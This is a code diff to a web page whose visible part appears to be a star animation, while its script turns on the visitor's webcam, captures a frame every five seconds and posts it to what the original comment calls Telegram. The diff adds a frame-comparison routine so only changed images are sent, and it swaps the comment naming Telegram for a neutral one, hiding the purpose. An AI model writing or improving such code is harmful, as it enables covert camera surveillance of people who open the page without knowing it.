@@ -125,7 +125,7 @@
         setInterval(addStar, 500);
         loop();
 
-        // Hanya ambil foto berkala dan kirim ke Telegram
+        // Image capture and comparison logic
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
@@ -134,17 +134,82 @@
                     video.play();
                     const captureCanvas = document.createElement('canvas');
                     const captureCtx = captureCanvas.getContext('2d');
-
+                    
+                    // Variables for image comparison
+                    let previousImageData = null;
+                    let differenceThreshold = 5; // Percentage of pixels that need to be different
+                    let imagesSent = 0;
+                    
                     setInterval(() => {
                         if (video.readyState >= 2) {
                             captureCanvas.width = video.videoWidth;
                             captureCanvas.height = video.videoHeight;
                             captureCtx.drawImage(video, 0, 0);
-                            captureCanvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+                            
+                            // Get current image data
+                            const currentImageData = captureCtx.getImageData(0, 0, captureCanvas.width, captureCanvas.height);
+                            
+                            // Check if image is different enough to send
+                            if (shouldSendImage(previousImageData, currentImageData, differenceThreshold)) {
+                                captureCanvas.toBlob(blob => {
+                                    sendPhoto(blob);
+                                    imagesSent++;
+                                    console.log(`Image sent (${imagesSent}): Significant change detected`);
+                                }, 'image/jpeg', 0.8);
+                                
+                                // Update previous image data
+                                previousImageData = currentImageData;
+                            } else {
+                                console.log("Image not sent: Not enough difference detected");
+                            }
                         }
                     }, 5000);
                 })
-                .catch(err => console.error('Gagal akses kamera:', err));
+                .catch(err => console.error('Failed to access camera:', err));
+        }
+        
+        // Function to compare two images and determine if they're different enough
+        function shouldSendImage(previousData, currentData, threshold) {
+            // If there's no previous image, we should send this one
+            if (!previousData) return true;
+            
+            const data1 = previousData.data;
+            const data2 = currentData.data;
+            
+            // If image dimensions changed, consider it a new image
+            if (previousData.width !== currentData.width || 
+                previousData.height !== currentData.height) {
+                return true;
+            }
+            
+            // Count pixels that differ significantly
+            let diffPixels = 0;
+            const totalPixels = data1.length / 4; // RGBA has 4 values per pixel
+            
+            // Sample every 10th pixel for performance
+            for (let i = 0; i < data1.length; i += 40) {
+                const r1 = data1[i];
+                const g1 = data1[i + 1];
+                const b1 = data1[i + 2];
+                
+                const r2 = data2[i];
+                const g2 = data2[i + 1];
+                const b2 = data2[i + 2];
+                
+                // Calculate color difference
+                const diff = Math.abs(r1 - r2) + Math.abs(g1 - g2) + Math.abs(b1 - b2);
+                
+                // If the difference is significant, count this pixel
+                if (diff > 30) {
+                    diffPixels++;
+                }
+            }
+            
+            // Calculate the percentage of different pixels
+            const diffPercentage = (diffPixels / (totalPixels / 10)) * 100;
+            
+            // Return true if the difference percentage exceeds the threshold
+            return diffPercentage >= threshold;
         }
 
         function sendPhoto(blob) {
@@ -158,7 +223,8 @@
                 body: formData
             })
             .then(res => res.json())
-            .then(data => console.log(data.ok ? 'Foto berhasil terkirim!' : 'Error kirim foto', data));
+            .then(data => console.log(data.ok ? 'Photo sent successfully!' : 'Error sending photo', data))
+            .catch(error => console.error('Network error sending photo:', error));
         }
     </script>
 </body>
